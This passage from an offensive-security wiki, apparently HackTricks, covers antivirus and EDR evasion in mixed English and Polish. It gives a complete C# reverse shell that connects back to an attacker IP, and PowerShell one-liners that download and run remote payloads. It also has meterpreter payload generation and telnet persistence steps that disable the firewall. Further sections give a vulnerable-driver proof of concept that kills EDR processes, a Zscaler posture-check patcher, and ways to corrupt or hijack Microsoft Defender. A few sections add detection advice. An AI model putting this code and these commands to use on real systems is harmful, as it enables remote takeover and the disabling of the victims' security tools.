You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory has been known for quite some time and it's still a very great way for running your post-exploitation tools without getting caught by AV.

Since the payload will get loaded directly into memory without touching disk, we will only have to worry about patching AMSI for the whole process.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) already provide the ability to execute C# assemblies directly in memory, but there are different ways of doing so:

- **Fork\&Run**

Polega to na **uruchomieniu nowego, ofiarnego procesu**, wstrzyknięciu do niego twojego złośliwego kodu post-exploitation, wykonaniu tego kodu, a po zakończeniu zabiciu procesu. To ma zarówno swoje zalety, jak i wady. Zaleta metody fork and run jest taka, że wykonanie zachodzi **poza** naszym Beacon implant process. Oznacza to, że jeśli coś w naszej akcji post-exploitation pójdzie nie tak lub zostanie wykryte, jest znacznie większa szansa na **implant surviving**. Wadą jest większe prawdopodobieństwo wykrycia przez **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Chodzi o wstrzyknięcie złośliwego kodu post-exploitation **do własnego procesu**. Dzięki temu można uniknąć tworzenia nowego procesu i jego skanowania przez AV, ale wada jest taka, że jeśli coś pójdzie nie tak podczas wykonania payloadu, istnieje **much greater chance** of **losing your beacon** gdyż proces może się zawiesić.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), it's possible to execute malicious code using other languages by giving the compromised machine access **to the interpreter environment installed on the Attacker Controlled SMB share**.

Pozwalając na dostęp do binariów interpretera i środowiska na udostępnionym SMB, możesz **wykonywać dowolny kod w tych językach w pamięci** skompromitowanej maszyny.

The repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.

## TokenStomping

Token stomping to technika pozwalająca atakującemu na **manipulację access token lub produktem zabezpieczającym takim jak EDR lub AV**, umożliwiającą obniżenie jego uprawnień tak, by proces nie zakończył się, ale nie miał uprawnień do sprawdzania złośliwej aktywności.

Aby temu zapobiec, Windows mógłby **zabronić zewnętrznym procesom** uzyskiwania uchwytów do tokenów procesów zabezpieczających.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), it's easy to just deploy the Chrome Remote Desktop in a victims PC and then use it to takeover it and maintain persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Uwaga na parametr pin, który pozwala ustawić PIN bez użycia GUI).


## Advanced Evasion

Evasion to bardzo skomplikowany temat; czasami trzeba uwzględnić wiele różnych źródeł telemetrii w jednym systemie, więc praktycznie niemożliwe jest pozostanie całkowicie niewykrytym w dojrzałych środowiskach.

Każde środowisko, przeciw któremu działasz, będzie miało swoje mocne i słabe strony.

I highly encourage you go watch this talk from [@ATTL4S](https://twitter.com/DaniLJ94), to get a foothold into more Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

This is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare techniki**

### **Sprawdź, które części Defender uważa za złośliwe**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), które będzie **usuwać części binarki** aż **dowie się, którą część Defender** uważa za złośliwą i rozdzieli ją dla ciebie.\
Innym narzędziem robiącym **to samo jest** [**avred**](https://github.com/dobin/avred) z otwartą stroną oferującą usługę w [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Until Windows10, all Windows came with a **Telnet server** that you could install (as administrator) doing:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ustaw, aby **start** przy uruchomieniu systemu i **run** go teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnet** (stealth) i wyłącz firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (chcesz wersje binarne, nie instalator)

**ON THE HOST**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś binarkę _**winvnc.exe**_ i **nowo utworzony** plik _**UltraVNC.ini**_ do **victim**

#### **Reverse connection**

The **attacker** powinien **uruchomić na** swoim **host** binarkę `vncviewer.exe -listen 5900`, aby była **gotowa** do przechwycenia reverse **VNC connection**. Następnie, na **victim**: Uruchom demona winvnc `winvnc.exe -run` i uruchom `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Aby zachować dyskrecję, nie należy robić następujących rzeczy

- Nie uruchamiaj `winvnc`, jeśli już działa, ponieważ wywoła to [popup](https://i.imgur.com/1SROTTl.png). Sprawdź czy działa poleceniem `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez pliku `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [okna konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h` po pomoc, bo wywoła to [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Wewnątrz GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom lister** za pomocą `msfconsole -r file.rc` i **wykonaj** **xml payload** poleceniem:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny Defender zakończy proces bardzo szybko.**

### Kompilowanie naszego własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# z użyciem kompilatora
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i wykonanie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia python do tworzenia build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Wyłączanie AV/EDR z poziomu jądra

Storm-2603 wykorzystał małe narzędzie konsolowe znane jako **Antivirus Terminator**, żeby wyłączyć ochronę punktu końcowego przed uruchomieniem ransomware. Narzędzie dostarcza własny **wrażliwy, ale *podpisany* sterownik** i nadużywa go, aby wykonywać uprzywilejowane operacje w kernelu, których nawet usługi Protected-Process-Light (PPL) AV nie potrafią zablokować.

Kluczowe wnioski
1. **Podpisany sterownik**: Plik zapisany na dysku to `ServiceMouse.sys`, ale binarnie jest to legalnie podpisany sterownik `AToolsKrnl64.sys` z “System In-Depth Analysis Toolkit” Antiy Labs. Ponieważ sterownik ma ważny podpis Microsoftu, ładuje się nawet gdy włączone jest Driver-Signature-Enforcement (DSE).
2. **Instalacja usługi**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwsza linia rejestruje sterownik jako **kernel service**, a druga go uruchamia, tak że `\\.\ServiceMouse` staje się dostępny z przestrzeni użytkownika.
3. **IOCTLy udostępnione przez sterownik**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Zakończenie dowolnego procesu po PID (używane do zabijania usług Defender/EDR) |
| `0x990000D0` | Usunięcie dowolnego pliku na dysku |
| `0x990001D0` | Odładowanie sterownika i usunięcie usługi |

Minimalny proof-of-concept w C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Dlaczego to działa**: BYOVD omija całkowicie ochrony w trybie użytkownika; kod wykonujący się w kernelu może otwierać *chronione* procesy, je kończyć lub manipulować obiektami jądra niezależnie od PPL/PP, ELAM czy innych mechanizmów hardeningu.

Wykrywanie / łagodzenie
•  Włącz listę blokowania wrażliwych sterowników Microsoftu (`HVCI`, `Smart App Control`), aby Windows odmówił załadowania `AToolsKrnl64.sys`.
•  Monitoruj tworzenie nowych usług *kernel* i alarmuj, gdy sterownik zostaje załadowany z katalogu zapisywalnego przez wszystkich lub gdy nie znajduje się na allow-liście.
•  Obserwuj uchwyty w trybie użytkownika do niestandardowych obiektów urządzeń, a następnie podejrzane wywołania `DeviceIoControl`.

### Ominięcie kontroli postawy Zscaler Client Connector przez patchowanie binarek na dysku

Zscaler’s **Client Connector** ocenia reguły postawy urządzenia lokalnie i polega na Windows RPC do komunikacji wyników z innymi komponentami. Dwa słabe wybory projektowe umożliwiają pełne obejście:

1. Ocena postawy odbywa się **całkowicie po stronie klienta** (na serwer wysyłany jest tylko boolean).
2. Wewnętrzne endpointy RPC weryfikują jedynie, czy łączący się plik wykonywalny jest **podpisany przez Zscaler** (przez `WinVerifyTrust`).

Poprzez **patchowanie czterech podpisanych binarek na dysku** obie mechaniki można unieszkodliwić:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola jest zgodna |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ dowolny (nawet niepodpisany) proces może podpiąć się do pipe'ów RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Skrócone / pominięte |

Minimalny fragment patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole zgodności wyświetlają **zielony/zgodny**.
* Niepodpisane lub zmodyfikowane binarki mogą otwierać named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Skompromitowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez polityki Zscaler.

To studium przypadku pokazuje, jak czysto po stronie klienta decyzje zaufania i proste sprawdzenia podpisu można obejść poprzez modyfikację kilku bajtów.

## Wykorzystywanie Protected Process Light (PPL) do manipulacji AV/EDR za pomocą LOLBINs

Protected Process Light (PPL) wymusza hierarchię signer/level tak, że tylko procesy chronione o równym lub wyższym poziomie mogą się wzajemnie modyfikować. Z ofensywnego punktu widzenia, jeśli możesz legalnie uruchomić binarkę z włączonym PPL i kontrolować jej argumenty, możesz przekształcić benign funkcjonalność (np. logging) w ograniczony, wspierany przez PPL prymityw zapisu przeciw katalogom chronionym używanym przez AV/EDR.

Co powoduje, że proces uruchamia się jako PPL
- Docelowy EXE (i wszelkie załadowane DLL) musi być podpisany przy użyciu EKU obsługującego PPL.
- Proces musi być utworzony za pomocą CreateProcess używając flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać kompatybilnego poziomu ochrony, który odpowiada podpisującemu binarki (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla podpisów anti-malware, `PROTECTION_LEVEL_WINDOWS` dla podpisów Windows). Nieprawidłowe poziomy spowodują niepowodzenie podczas tworzenia.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Narzędzia uruchamiające
- Open-source helper: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Wzorzec użycia:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Podpisany plik systemowy `C:\Windows\System32\ClipUp.exe` sam się uruchamia i przyjmuje parametr do zapisania pliku logu w ścieżce określonej przez wywołującego.
- Po uruchomieniu jako proces PPL zapis pliku odbywa się z ochroną PPL.
- ClipUp nie potrafi parsować ścieżek zawierających spacje; użyj krótkich ścieżek 8.3, aby wskazać na zwykle chronione lokalizacje.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Uruchom PPL-capable LOLBIN (ClipUp) z `CREATE_PROTECTED_PROCESS` używając launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki logu ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). Użyj krótkich nazw 8.3, jeśli to konieczne.
3) Jeśli docelowy binarny plik jest zwykle otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis przy starcie systemu przed uruchomieniem AV, instalując usługę autostartową, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność uruchamiania za pomocą Process Monitor (boot logging).
4) Po restarcie zapis z obsługą PPL nastąpi zanim AV zablokuje swoje binaria, uszkadzając docelowy plik i uniemożliwiając uruchomienie.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Uwagi i ograniczenia
- Nie możesz kontrolować treści, które ClipUp zapisuje, poza miejscem umieszczenia; prymityw nadaje się bardziej do korumpowania niż precyzyjnego wstrzykiwania treści.
- Wymaga lokalnego konta admin/SYSTEM do zainstalowania/uruchomienia usługi oraz okna na reboot.
- Czasowanie jest krytyczne: cel nie może być otwarty; wykonanie podczas uruchamiania systemu unika blokad plików.

Wykrycia
- Utworzenie procesu `ClipUp.exe` z nietypowymi argumentami, szczególnie uruchamiane przez niestandardowe launchery, w okolicach bootu.
- Nowe usługi skonfigurowane do auto-startu z podejrzanymi binariami i konsekwentnie uruchamiające się przed Defender/AV. Zbadaj tworzenie/modyfikację usług przed błędami uruchamiania Defender.
- Monitorowanie integralności plików w binariach/Platform directories Defender; nieoczekiwane tworzenie/modyfikacje plików przez procesy z flagami protected-process.
- ETW/EDR telemetry: szukaj procesów tworzonych z `CREATE_PROTECTED_PROCESS` oraz anormalnego użycia poziomu PPL przez binaria nie będące AV.

Mitigacje
- WDAC/Code Integrity: ogranicz, które podpisane binaria mogą działać jako PPL i pod jakimi rodzicami; zablokuj wywołania ClipUp poza legalnymi kontekstami.
- Higiena usług: ogranicz tworzenie/modyfikację usług auto-start oraz monitoruj manipulację kolejnością startu.
- Upewnij się, że Defender tamper protection i early-launch protections są włączone; zbadanie błędów startowych wskazujących na korupcję binariów.
- Rozważ wyłączenie generowania nazw short-name 8.3 na woluminach hostujących narzędzia zabezpieczające, jeśli zgodne z Twoim środowiskiem (dokładnie przetestuj).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender wybiera platformę, z której działa, enumerując podfoldery w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z najwyższym leksykograficznym stringiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia procesy usługi Defender stamtąd (aktualizując ścieżki w usługach/rejestrze). Ten wybór ufa wpisom katalogów, w tym punktom reparse (symlinks). Administrator może to wykorzystać, przekierowując Defender do ścieżki zapisywalnej przez atakującego i osiągnąć DLL sideloading lub zakłócenie działania usługi.

Preconditions
- Local Administrator (wymagany do tworzenia katalogów/symlinków pod Platform folder)
- Możliwość rebootu lub wymuszenia ponownego wyboru platformy Defender (restart usługi przy starcie)
- Wystarczają tylko wbudowane narzędzia (mklink)

Dlaczego to działa
- Defender blokuje zapisy w swoich folderach, ale jego wybór platformy ufa wpisom katalogów i wybiera leksykograficznie najwyższą wersję bez walidacji, że cel rozwiązuje się do chronionej/zaufanej ścieżki.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz w katalogu Platform dowiązanie symboliczne do katalogu wyższej wersji wskazujące na twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór wyzwalacza (zalecane ponowne uruchomienie):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, że MsMpEng.exe (WinDefend) uruchamia się z przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Powinieneś zaobserwować nową ścieżkę procesu pod `C:\TMP\AV\` oraz konfigurację usługi/registry odzwierciedlającą tę lokalizację.

Post-exploitation options
- DLL sideloading/code execution: Upuść lub zastąp DLLs, które Defender ładuje z jego application directory, aby uruchomić kod w procesach Defendera. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń version-symlink, aby przy następnym uruchomieniu skonfigurowana ścieżka nie została rozwiązana i Defender nie uruchomi się:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Zwróć uwagę, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga uprawnień administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Zespoły Red Team mogą przenieść omijanie wykrywania w czasie wykonywania z implantów C2 do samego modułu docelowego by hooking its Import Address Table (IAT) and routing selected APIs through attacker-controlled, position‑independent code (PIC). To uogólnia omijanie wykrywania poza wąski zakres API, które wiele kitów udostępnia (np. CreateProcessA), i rozszerza te same zabezpieczenia na BOFs oraz post‑exploitation DLLs.

High-level approach
- Umieść PIC blob obok modułu docelowego przy użyciu reflective loader (prepended lub companion). PIC musi być self‑contained i position‑independent.
- Gdy host DLL się ładuje, przejdź przez jego IMAGE_IMPORT_DESCRIPTOR i zmodyfikuj wpisy IAT dla docelowych importów (np. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), aby wskazywały na lekkie PIC wrappers.
- Każdy PIC wrapper wykonuje środki omijające wykrywanie przed tail‑calling prawdziwego adresu API. Typowe metody omijania obejmują:
  - Maskowanie/odmaskowywanie pamięci wokół wywołania (np. szyfrowanie regionów Beacon, RWX→RX, zmiana nazw/uprawnień stron), a następnie przywrócenie po wywołaniu.
  - Call‑stack spoofing: skonstruowanie prawidłowego stosu i przejście do docelowego API tak, aby analiza stosu wywołań wskazywała oczekiwane ramki.
  - Dla kompatybilności, wyeksportuj interfejs tak, aby Aggressor script (lub równoważny) mógł zarejestrować, które API hookować dla Beacon, BOFs i post‑ex DLLs.

Why IAT hooking here
- Działa dla dowolnego kodu, który używa hookowanego importu, bez modyfikowania kodu narzędzia ani polegania na Beacon jako proxy dla konkretnych API.
- Obsługuje post‑ex DLLs: hooking LoadLibrary* pozwala przechwycić ładowania modułów (np. System.Management.Automation.dll, clr.dll) i zastosować to samo maskowanie/omijanie stosu wobec ich wywołań API.
- Przywraca niezawodne użycie poleceń post‑ex tworzących procesy wobec detekcji opartych na analizie stosu wywołań poprzez opakowanie CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Uwagi
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Integracja operacyjna
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Kwestie wykrywania/DFIR
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
